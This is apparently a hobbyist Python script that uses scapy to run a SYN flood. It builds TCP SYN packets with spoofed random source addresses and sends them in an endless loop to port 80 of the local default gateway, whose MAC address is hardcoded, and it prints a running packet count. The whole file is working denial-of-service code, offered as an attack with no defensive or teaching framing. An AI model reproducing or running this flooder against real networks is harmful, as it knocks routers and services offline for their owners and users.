from scapy.all import TCP, IP, Ether, sendp, conf ,get_if_addr, getmacbyip, RandIP, RandShort
from rich import print

#getting pc LOCAL IP address.
my_ip = get_if_addr(conf.iface)
print(f"[bold purple][*][/bold purple] [bold white]Local IPV4 addr:[/bold white] [bold yellow]{my_ip}[/bold yellow]")

#getting ROUTER IPV4 and MAC.
router_ip = conf.route.route("8.8.8.8")[2] #returns the ip that the pc would use to access 8.8.8.8 (google dns) which is the Default Gateway.
router_mac = "d8:0d:17:9f:c5:bc"
print(f"[bold blue][~][/bold blue] [bold white]Default Gateway IPV4 addr:[/bold white] [bold red]{router_ip}[/bold red]")

#Creating a SYN packet in PORT 80 TCP Protocol.
syn_packet = Ether(dst = router_mac) /IP(src = RandIP(),dst = router_ip) / TCP(sport = RandShort(), dport=80, flags = "S")

print("\n\n[bold white]Starting[/bold white] [bold blue]SYN[/bold blue] [cyan]Flooding.[/cyan]")
print("\n\n[bold purple][*][/bold purple] [bold white]Press [bold green]Ctrl[/bold green] [bold yellow]+[/bold yellow] [bold green]C[/bold green] To[/bold white] [bold red]Stop[/bold red]")

packets_count = 0
#while looping until user Interupt with CTRL + C
try:
    while( True):

        #printing dot every 1000 packets
        if( packets_count >0 and packets_count%1000 ==0):
            print(f"[cyan]{packets_count} Packets Sent[/cyan]")

        #sending packet
        sendp(syn_packet, verbose =False)
        packets_count+=1

except KeyboardInterrupt:
    #printing to user The attack Stopped.
    print("\n[bold purple][*][/bold purple] [bold red]Stopping.[/bold red]")